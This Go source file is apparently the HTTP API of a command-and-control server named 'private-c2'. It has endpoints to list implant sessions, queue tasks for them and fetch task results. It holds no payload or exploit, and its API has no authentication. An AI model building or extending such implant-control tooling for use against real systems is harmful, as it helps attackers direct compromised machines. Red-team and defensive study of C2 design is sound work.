package httpapi

import (
	"encoding/json"
	"net/http"
	"strings"

	"github.com/azizbinmohammad/private-c2/server/c2"
)

// TaskRequest is the JSON body for POST /api/sessions/:id/task.
type TaskRequest struct {
	Type string `json:"type"`
	Args string `json:"args"`
}

// TaskResponse is the JSON response after queuing a task.
type TaskResponse struct {
	TaskID string `json:"task_id"`
}

// ErrorResponse is a generic JSON error envelope.
type ErrorResponse struct {
	Error string `json:"error"`
}

// PendingResponse indicates a task has not yet completed.
type PendingResponse struct {
	Status string `json:"status"`
}

// NewRouter creates an http.Handler wired to the given ImplantServer.
func NewRouter(implantServer *c2.ImplantServer) http.Handler {
	mux := http.NewServeMux()

	mux.HandleFunc("/api/sessions", func(w http.ResponseWriter, r *http.Request) {
		setCORS(w)
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}

		// Only exact match -- no trailing path component.
		if r.URL.Path != "/api/sessions" {
			writeJSON(w, http.StatusNotFound, ErrorResponse{Error: "not found"})
			return
		}

		if r.Method != http.MethodGet {
			writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
			return
		}

		sessions := implantServer.ListSessions()
		writeJSON(w, http.StatusOK, sessions)
	})

	mux.HandleFunc("/api/sessions/", func(w http.ResponseWriter, r *http.Request) {
		setCORS(w)
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}

		// Parse: /api/sessions/{id} or /api/sessions/{id}/task
		path := strings.TrimPrefix(r.URL.Path, "/api/sessions/")
		parts := strings.SplitN(path, "/", 2)
		sessionID := parts[0]

		if sessionID == "" {
			writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "missing session ID"})
			return
		}

		if len(parts) == 1 {
			// GET /api/sessions/{id}
			if r.Method != http.MethodGet {
				writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
				return
			}

			sess := implantServer.GetSession(sessionID)
			if sess == nil {
				writeJSON(w, http.StatusNotFound, ErrorResponse{Error: "session not found"})
				return
			}
			writeJSON(w, http.StatusOK, sess)
			return
		}

		subpath := parts[1]
		if subpath == "task" {
			// POST /api/sessions/{id}/task
			if r.Method != http.MethodPost {
				writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
				return
			}

			var req TaskRequest
			if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
				writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "invalid JSON: " + err.Error()})
				return
			}

			if req.Type == "" {
				writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "task type is required"})
				return
			}

			taskID, err := implantServer.QueueTask(sessionID, req.Type, req.Args)
			if err != nil {
				writeJSON(w, http.StatusNotFound, ErrorResponse{Error: err.Error()})
				return
			}

			writeJSON(w, http.StatusCreated, TaskResponse{TaskID: taskID})
			return
		}

		writeJSON(w, http.StatusNotFound, ErrorResponse{Error: "not found"})
	})

	mux.HandleFunc("/api/tasks/", func(w http.ResponseWriter, r *http.Request) {
		setCORS(w)
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}

		if r.Method != http.MethodGet {
			writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
			return
		}

		taskID := strings.TrimPrefix(r.URL.Path, "/api/tasks/")
		if taskID == "" {
			writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "missing task ID"})
			return
		}

		result := implantServer.GetResult(taskID)
		if result == nil {
			writeJSON(w, http.StatusOK, PendingResponse{Status: "pending"})
			return
		}

		writeJSON(w, http.StatusOK, result)
	})

	return mux
}

func setCORS(w http.ResponseWriter) {
	w.Header().Set("Access-Control-Allow-Origin", "http://localhost:*")
	w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
}

func writeJSON(w http.ResponseWriter, status int, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(v)
}
